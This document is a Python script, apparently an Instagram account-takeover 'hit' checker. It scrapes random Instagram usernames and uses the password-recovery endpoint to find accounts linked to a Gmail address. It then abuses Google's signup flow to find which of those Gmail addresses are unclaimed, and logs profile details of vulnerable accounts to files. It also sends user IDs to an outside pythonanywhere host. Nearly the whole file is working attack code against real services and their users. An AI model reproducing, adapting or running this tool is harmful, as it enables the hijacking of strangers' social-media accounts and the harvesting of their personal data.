import requests
import random
import json
import os
import sys
import time
import threading
#----------------------------------
Red_Dark = "\033[38;5;1m"
Green_Dark = "\033[38;5;2m"
Yellow_Dark = "\033[38;5;3m"
Cyan_Dark = "\033[38;5;6m"
#----------------------------------
class Instagram:
    def __init__(self):
        self.hit=0
        self.bad_insta =0
        self.god_gmail =0
        self.bad_gmail =0
        for i in range(10):
            threading.Thread(target=self.generate_username).start()
    def rest(self,username):
        if "@" in username:
            username = username.split("@")[0]
        url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
        payload = {
            'signed_body': "62535727a9128dcd476abccbe0f8745d5fbc9817f67907fa66d71a73cd34480d.{\"_csrftoken\":\"dzP3whO7QXentctm9xQ4QQKw0Y3vce23\",\"adid\":\"38e5eed1-f1e7-4c14-b6e8-66d3eaa89cbc\",\"guid\":\"df8d8d7e-7663-456e-a1d1-be0baae9f075\",\"device_id\":\"android-f73cb4dcf6cca4a0\",\"query\":\"" + username + "\"}",
            'ig_sig_key_version': "4"
        }

        headers = {
            'User-Agent': "Instagram 100.0.0.17.129 Android (28/9; 300dpi; 900x1600; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 161478664)",
            'Accept-Encoding': "gzip, deflate",
            'X-Pigeon-Session-Id': "125539d6-8af9-47fc-a365-fbcd7307825b",
            'X-Pigeon-Rawclienttime': "1758893853.073",
            'X-IG-Connection-Speed': "-1kbps",
            'X-IG-Bandwidth-Speed-KBPS': "-1.000",
            'X-IG-Bandwidth-TotalBytes-B': "0",
            'X-IG-Bandwidth-TotalTime-MS': "0",
            'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
            'X-IG-Connection-Type': "WIFI",
            'X-IG-Capabilities': "3brTvw==",
            'X-IG-App-ID': "567067343352427",
            'Accept-Language': "en-US",
            'X-FB-HTTP-Engine': "Liger",
            'Cookie': "mid=aNDkaQABAAFTP99OkoCOxfi_ZKLK; csrftoken=dzP3whO7QXentctm9xQ4QQKw0Y3vce23"
        }

        response = requests.post(url, data=payload, headers=headers)

        try:
            return response.json()["email"]
        except:
            return "error"
    def check_rest(self,email,rest):
        if "@" in email or "@" in rest:
            email = email.split("@")[0]
            rest = email.split("@")[0]
        e1 = email[0];e2 = email[-1];s1 = rest[0];s2 = rest[-1]
        if e1 == s1 and e2 == s2:
            return True
        else:
            return False

    def get_info(self,username):
        if "@" in username:
            username = username.split("@")[0]
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.8',
            'priority': 'u=1, i',
            'referer': 'https://www.instagram.com/{}/?__a=1'.format(username),
            'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Brave";v="140"',
            'sec-ch-ua-full-version-list': '"Chromium";v="140.0.0.0", "Not=A?Brand";v="24.0.0.0", "Brave";v="140.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-model': '""',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'x-asbd-id': '359341',
            'x-csrftoken': 'x2iSMy4TfpHQgb8TsCnyvu',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-requested-with': 'XMLHttpRequest',
            'x-web-device-id': 'DA13BB67-4458-4780-8A99-17DB92B17718',
            'x-web-session-id': 'gba5vd:4a2vce:sghd2l',

        }

        params = {
            'username': username,
        }

        response = requests.get(
            'https://www.instagram.com/api/v1/users/web_profile_info/',
            params=params,
            headers=headers,
        )
        try:
            data = response.json()['data']['user']
            bio = data['biography']
            followers = data['edge_followed_by']['count']
            following = data['edge_follow']['count']
            name = data['full_name']
            bussiness = data['is_business_account']
            id = data['id']
            private = data['is_private']
            verf = data['is_verified']
            photo = data['profile_pic_url']
            rest = self.rest(username+"@gmail.com")
            cor = self.check_rest(username+"@gmail.com",rest)
            ds = requests.get("https://jokerpython33.pythonanywhere.com/?id={}".format(id)).json()['data']
            messages = f"""
        ________________[HIT]________________
        username : {params['username']}
        bio : {bio}
        email : {username}@gmail.com
        followers : {followers}
        following : {following}
        name : {name}
        bussiness : {bussiness}
        id : {id}
        url : {photo}
        private : {private}
        verification : {verf}
        rest : {rest}
        correct : {cor}
        ________________[HIT]________________
            """
            print(messages)
            with open("hit.txt","a",encoding="utf-8") as f:
                f.write(messages+"\n")
        except:
            rest = self.rest(username+"@gmail.com")
            cor = self.check_rest(username+"@gmail.com",rest)
            messages = f"""
        ________________[HIT]________________
        username : {params['username']}
        email : {username}@gmail.com
        rest : {rest}
        correct : {cor}
        ________________[HIT]________________
            """
            print(messages)
            with open("hit2.txt","a",encoding="utf-8") as f:
                f.write(messages+"\n")

    def check_gmali(self,emali):
        if "@" in emali: emali = emali.split("@")[0]
        client = requests.session()
        # -------------------------------------------------------------------------------------------
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'priority': 'u=0, i',
            'referer': 'https://accounts.google.com/',

            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 Edg/140.0.0.0',

        }

        params = {
            'biz': 'false',
            'continue': 'https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1',

            'flowEntry': 'SignUp',
            'flowName': 'GlifWebSignIn',
            'hl': 'en',

        }

        # https://accounts.google.com/lifecycle/steps/signup/name?continue=https://myaccount.google.com/?utm_source%3Dsign_in_no_continue%26pli%3D1&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&TL=AMbiOOQfwmog2EzoCdG0KSQQ_HBwLfnLE55EHN0WPkAW6QABEeIlTU1JzvzYlHbS

        response = client.get('https://accounts.google.com/lifecycle/flows/signup', params=params, headers=headers)
        s1 = response.text.split('"Qzxixc":"')[1].split('"')[0]
        tl = response.url.split("TL=")[1]

        at = response.text.split('"SNlM0e":"')[1].split('"')[0]
        print(s1)
        print(tl)
        print(at)
        # ---------------------------------------------------------------------------------------------------------------
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'priority': 'u=1, i',
            'referer': 'https://accounts.google.com/',

            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 Edg/140.0.0.0',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
            'x-same-domain': '1',

        }

        params = {
            'rpcids': 'E815hb',
            'source-path': '/lifecycle/steps/signup/name',

            'hl': 'en',
            'TL': tl,

        }
        name = ''.join(random.choice("qwertyuiopasdfghjklzxcvbnm") for i in range(random.randrange(5, 9)))
        data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22{}%5C%22%2C%5C%22%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(
            name, at)

        response = client.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        )
        # -----------------------------------------------------------------------------------------------------------------
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'priority': 'u=1, i',
            'referer': 'https://accounts.google.com/',

            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 Edg/140.0.0.0',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
            'x-same-domain': '1',

        }

        params = {
            'rpcids': 'eOY7Bb',
            'source-path': '/lifecycle/steps/signup/birthdaygender',

            'hl': 'en',
            'TL': tl,

        }

        data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B{}%2C{}%2C{}%5D%2C2%2Cnull%2Cnull%2Cnull%2Cnull%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue%26pli%3D1%5C%22%2Cnull%2Cnull%2Cnull%2C%5B%5C%22GAlAwAE%5C%22%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22accountsettings%5C%22%5D%2C%5B%5C%22%3CcLxqvOQCAAb-Ypuu3mKNmoe1Zztlks70ADQBEArZ1EBlvfIfT8NAZwZdjpqEjnTnq-rmMH81c4NViqenG0xIPwCIeIyBtooYa57MPmkxzQAAAgOdAAAAB6cBB7EATseCgPfFoYiiEUv6gqlezfzEWuAnGeibW7Izu5Xt7JPGspaPT8n6UqAJ6kA7apuL8qLZLZI2N0y12NR3Fog6U4dFpldDdvFfJhOWcovOzVYHf_1hvrqvXVGTk12qL3geiEWcqWC1EbRkmFmvsg8wKVE6q-daPL0XZi0d6HxGmy7zg7M8-ZJjTBgII2y6LsbgXoN0juhpLr4LXCB04_OEo2jmRo74f0gFktOqhlhDIN8kK3Tmj5kEY6zSANRpjOKAgAcjQUZJgQepORGeSserNEX-sjUDpZ8U3KCc7n9QaKVCXih5D2NY63vvZTYIFMwP--Y70VMX80ERXGZnhEDKqwqA_uLcd8a8HMfdUX0FeQoUpJuokG4XeYB3_kSzYeRx822cYFpSvf8lxY6o7aPIwZrqZNlrSjXC_qeC5-KbVIG6srMklw074L8Yrpb8yqlXig9zp7mfgDwLP91On0mUYhOe4QBfpaQ5iCAxUocO6oXRCzEUCFDd2DzyncVu8AT4PIEL9SH1FwCA-PP055wQinDkFUY-2c-ftt5hkj3E7HvYEcX3_pmk9Ee5LheWBRhQaqR2LlEmR68jKLVQgEZ739ZIaOFHKE2nJgE5-P8MquDoWbCXoi8lO0xDwO0rnI5fgSBjnapb71UFu827lYduAdGR6IHORR23AyR55nIEqeP-nOq9NJF7UOk-i5pH_XcjCXTG9SxpsmjQCex1LS377TCClzD8Tsx_9E1yySMcz_FshWbl3B3aWgUM282laEgPbkUlvX9gUpaOQ_Zs2qZsnqmkJxAidiKtDo32kwpYieT85TenUSt8BQNFVyVYSoVfvLx_gv1lKQTp66MQA_JWVZBu5NjWbJiivuarMldjKT5TxGIgWaVJOSENdepciB_fZUi9u2TVnKmjoBpPVl3j-uk0OtXiUP8byiOW-NcHim_cn8P6bpYJ_jNzhD50n0VXBMY50n8YSt1MZde3BBl_GRmuGW60rbIW7Q0w8vqpajlbvCgkSmKbfwFaHoYH_Kp_x_KYivgs55gPrKD8x8QxZ48wWZZT3JXH7iAyEKeuBTg5IIK7aY0-QDk_pFEgNKi-8lA5lve8M8wdaESvTBVCH7BtYzUl324TQSVk1640jXh0CsFwIs8Kr_nHgzRzkWFLdw1JZdhxwVlzICEI5WwSHuwL7YuedbWwWIXVLChXVQxIo53ZKilybo0xxcGydVWky2IJwVMiy51UtvdH2aFwM7vwWhhW0GV-XSsXXhoUsgWUgLSZs5oywYhHf3NphbNkqfiQSsyBVXEEXxbk0R532TooQPw7vNBeIDxGDh1gL6MzWN669nMMnPpZH9w3b5b7PhrEgvI4_hLUY3Uu8e9PCdigMmFTelao9T0YC66OlE4dcQ7m-ZIJSILiwq7EkaVjUEpaBB7Ds3hi3nhGlTuJ0hP2oVTEOPLAyfmRH5VwJUp3jPnZxSj2kzkjpDQ2cuk40CVQn96l-d_I2Uj3a8jc2zIcNdoICKM5Zn3tF8nab1DW9V6jzsjmCOmYGeZijyOzDnp7-rpJRLl2N6UFfsa41vqLod368HaSIyWwjdg04sax5LLjddH9-lnMNYKT1FKegwPZp_4xOXtu-SXGSEpz4ew8auTFZHL3oxeumvAJqfC6B1PiFcNp1oVUzb2gPINhwlKToDKXnnNgpdvrmiucsHVK94lR7P7XD8zpT1HM3ZQtUB1UcpB9xy3oaBabGTtc2baEh4h2iXCe1rQgziq22YFqbMpJwtbg1CrEt8MfYYfDjej0yQOEfZL306YnnuQHXZyeMYKzaPDBv97KE4NdJw7u-r_6GhaAJJe8EFdRwE2HNP5hiiH8XfyqfYChcFyXTGWf8RdYxDwz6omtkuILQoGbCU8S7vCTZh8DUJUvu3kIYb6rt9ApJz2EDCVRrysCaamtfwRPaDZTHlI7Z5l-zheOFAUrH4DW1PITP80EUpsYXxYT2r62d5kl_fUC_21yUKPiGyoRVq_SWTC1gCaVCiA3aQSh27rMyzRSaZz1K_ZaqWVLFQrDCoqAoZaeBriKkc4FFS6uBH5iEFxfanxO0xbsNHop31QZSE22NkLtJUQFoX1zKpaWA9KUNp6jWjO8pO7WcNxzNK-xHDXtOyEalC_FitIzzqHeh8fNdKLNEFjcu-cnG5yoYQhxRVII2xxA3OxzzAdFk2nMjqJmIMvmRGpyTYa_kIFZE39GsgJIXoXdxEVfbwr4fLtmcGXzNQa46_b9Z5cXTB3SBomsos17tuorS9HK0G-uuC8QT0DjdVnJOFQpYXy-fh2Ik2E-EZfMykvJtw_Jk37uZHoEKmywRDkVeIA9wnpkDJbfB1BO3G6PCLUzhLX3dKM1r0XQy98rilGBdltgp9rnTOPCKDUL_5UWkroLqiYo0aI0N4JG330_Wb6z3CXSHwe9vJ49oFOywHzlS5aUtCdDOiF3RffmJvEeDyu6iNLTALVzFnRcI3pC_MEIIGk6K0g8egZrwO4NbWn71haVonMCUAz1sfCBXdS-UE7L4et8Mz0QrRd1aLIUq1KomH0rXZTRqRXlbpGIldHrICctqdST4SOdLJ7D5x_hncq2l4czJmLzQMLLQYQfVazXuDZYsMtHg3FKuBrIXezVKfH1uT8xPHlzFTP4GybPPMwRYajFKT3oqZHuoDJl%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5C%220cAFcWeA6E_F1jVtckiZmZg3kFxhl4hTKeiZB4eNdCYDp76sAQT2tztqNWJxb1aBI-6GbudGonPQc_zz6Gedm0U676gcDzKO0YxIErAE_zqEUKqqPJ8WJIvF3ZG-0vNKBUavDUSxQwn_8yJjUT3hYt3rYHkjMKDq4Gk9IuCjvgeGGhhTs_egIuowGHR4Ur_cvLLbQ6RMn_pbE-PZhC-7zSBDxsVqMpjlbcNkC_LHxcW_ps8BBkh6BypQspJFD5lGmIHingPnhuv0D6Udk1F-HMcjj-U2XiW4_TUADT89QCFajuz1C4lPKFdqZ-NgUXUbLhfykT07FRFCCM-VWbREFYVQts3I5nNtfScKgdbMoaHZhFPT5lpWntQANvkuUzSCpEkXtndDykQNMtzM7qU9tpiwKdB8GTVL0fA2FKK0fz6c5WEmIVmvuP48-Qn0CB_tWgMVJyp2FIRR0yAD3vB7L0SrBWxvse4KwtnVzmHINXzIekwY_6IzkEjmn9kAxWlJiPdepLAvwtCLzB4gbi2aLolQJcX4aCKe0-wyZlDJ-fpTvioSLiTavKscIYdZil2sNl_PSXOGjuMO30Av5elG8Mq_9YPYQg4psjwBXc8snONLa42ZAQgeTeMtRoZpZsUXY-gnrXT404Vi_mUeIEJ2N8SysJ1LdQFNrmZ179UkIjrJlFD0lW8lmdpy9ntNIPMyHvBmADqBJJl8LJcApwzto_m4px1ioOmmIaVfFf_qDzYTQYiSaQ7qyHom7ecTNub2KvlZtQc1JHZzGqXP7xcIM_RQBeGbNGEYnps_BUzonzi2LTtEA2rjLx6xg_y4uJBbawHYeGxi5MwmckKaQK4oig7lIL0xRXQ0L1NsTJ4WbJAL1EN9muiXiXJhM1IvypKzsEVO8w5SLd4B8IlrKna9s4ZRFJAbG1e3K5nDgTO0fKJj4m5hAX8zJaMb_xWFCx-aCfpVmaAiV9Wat5ADXCCTuL9GfcE9mXes3wF9yeV5Uq3T46cEUMHSOK7ywPqh6NenlH2pEqqQxohPlE9ivdG5KCuLzkbdPdYDOFaZEqDBfXA7CdupEGqDYVVqdM1-cW2_DdI3a4fHDZlsMGIumvqLZTHAElZQCA9rBt66lA_HCqV5pzNn-30Si_GvK4Uxkz5tIYMi5GO6GXwEv3OqEd79MfJw8fB0oQDGQvCRzvgSbuB01xyS9apBoyzkqu4l0l-S9aovtQ82Mq2aYNn2hobHkxIUgfncgMwpycwQAYXtN2TADZ3r-c4iYQR5dp9SpIZZqilsY3OLD1VcCI91xGB8cy4B3fkhkwfwc5vdmsrFNYl5n6asyhuNqcIuJ3NWgKRJwAFIDm3n0v53oKXUav5bmQLRp8nwGf4MQykBCKC2Ui6EbueSl00YkISnfzaPc0QESlhsM5vIgI3RjbOHyChd9VNWzbpGyGtgNUkQQlWXJQhwyi0DUF7mg9MYapJJQ8_zGp9wVHo-8Ur-f7f1EHssrbocv2AiTHeLgyqeczmtu9yCqhb5N4yaOcne5ekFJVWlRiTtHKkWMk44D1QdaGGuQfXN0nhqQIaiOcbSFdByBqC7g7_ODWVTA7dXnde1r9-gzJc9mHv42K0Sf2Ayal6xxAYqynCXDYClfzOg%5C%22%2C1%5D%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(
            random.randint(1995, 2007), random.randint(1, 12), random.randint(1, 28), at)

        response = client.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        )
        # ---------------------------------------------------------------------------------------------------------------

        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'origin': 'https://accounts.google.com',
            'priority': 'u=1, i',
            'referer': 'https://accounts.google.com/',

            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 Edg/140.0.0.0',
            'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
            'x-goog-ext-391502476-jspb': '["' + s1 + '"]',
            'x-same-domain': '1',
        }

        params = {
            'rpcids': 'NHJMOd',
            'source-path': '/lifecycle/steps/signup/username',

            'hl': 'en',
            'TL': tl,

        }

        data = 'f.req=%5B%5B%5B%22NHJMOd%22%2C%22%5B%5C%22{}%5C%22%2C1%2C0%2Cnull%2C%5Bnull%2Cnull%2Cnull%2Cnull%2C0%2C3188%5D%2C0%2C40%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at={}&'.format(
            emali, at)

        response = client.post(
            'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
            params=params,

            headers=headers,
            data=data,
        )
        if "password" in response.text:
            self.god_gmail
            print(f'\r HIT : {self.hit} GOD_GM : {self.god_gmail} BAD : {self.bad_insta} FALLS : {self.bad_gmail}', end='')
            self.get_info(emali)
        else:
            self.bad_gmail
            print(f'\r HIT : {self.hit} GOD_GM : {self.god_gmail} BAD : {self.bad_insta} FALLS : {self.bad_gmail}', end='')

    def check_instagram(self,email):
        url = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"

        payload = {
            'signed_body': "5d50254e58fa12924be5d2d324ca88ead36675d6019d9a5d8fe436420532dd92.{\"_csrftoken\":\"dzP3whO7QXentctm9xQ4QQKw0Y3vce23\",\"adid\":\"38e5eed1-f1e7-4c14-b6e8-66d3eaa89cbc\",\"guid\":\"df8d8d7e-7663-456e-a1d1-be0baae9f075\",\"device_id\":\"android-f73cb4dcf6cca4a0\",\"query\":\"" + email + "\"}",
            'ig_sig_key_version': "4"
        }

        headers = {
            'User-Agent': "Instagram 100.0.0.17.129 Android (28/9; 300dpi; 1600x900; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 161478664)",
            'Accept-Encoding': "gzip, deflate",
            'X-Pigeon-Session-Id': "06c9adf4-58a1-4523-b62b-a456137c202c",
            'X-Pigeon-Rawclienttime': "1758909376.184",
            'X-IG-Connection-Speed': "-1kbps",
            'X-IG-Bandwidth-Speed-KBPS': "-1.000",
            'X-IG-Bandwidth-TotalBytes-B': "0",
            'X-IG-Bandwidth-TotalTime-MS': "0",
            'X-Bloks-Version-Id': "009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0",
            'X-IG-Connection-Type': "WIFI",
            'X-IG-Capabilities': "3brTvw==",
            'X-IG-App-ID': "567067343352427",
            'Accept-Language': "en-US",
            'X-FB-HTTP-Engine': "Liger",
            'Cookie': "mid=aNDkaQABAAFTP99OkoCOxfi_ZKLK; csrftoken=dzP3whO7QXentctm9xQ4QQKw0Y3vce23"
        }

        response = requests.post(url, data=payload, headers=headers)

        if "can_recover_with_code" in response.text:
            self.hit +=1
            print(f'\r HIT : {self.hit} GOD_GM : {self.god_gmail} BAD : {self.bad_insta} FALLS : {self.bad_gmail}', end='')
            self.check_gmali(email)
        else:
            self.bad_insta +=1
            print(f'\r HIT : {self.hit} GOD_GM : {self.god_gmail} BAD : {self.bad_insta} FALLS : {self.bad_gmail}', end='')

    def generate_username(self):
        while True:
            response = requests.post('https://www.instagram.com/graphql/query').cookies.get_dict()
            csrftoken = response['csrftoken']

            headers = {

                'content-type': 'application/x-www-form-urlencoded',

                'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36 Edg/140.0.0.0',

                'x-csrftoken': csrftoken,

            }

            data = {

                'lsd': csrftoken,

                'variables': '{"enable_integrity_filters":true,"id":' + str(random.randint(10000,
                                                                                           21254029834)) + ',"render_surface":"PROFILE","__relay_internal__pv__PolarisProjectCannesEnabledrelayprovider":false,"__relay_internal__pv__PolarisProjectCannesLoggedInEnabledrelayprovider":false,"__relay_internal__pv__PolarisProjectCannesLoggedOutEnabledrelayprovider":false,"__relay_internal__pv__PolarisCannesGuardianExperienceEnabledrelayprovider":false,"__relay_internal__pv__PolarisCASB976ProfileEnabledrelayprovider":false}',

                'doc_id': '24896351156628291',
            }

            response = requests.post('https://www.instagram.com/graphql/query', headers=headers, data=data)

            try:
                user = response.json()['data']['user']['username']
                self.check_instagram(user+"@gamil.com")
            except:
                pass
Instagram()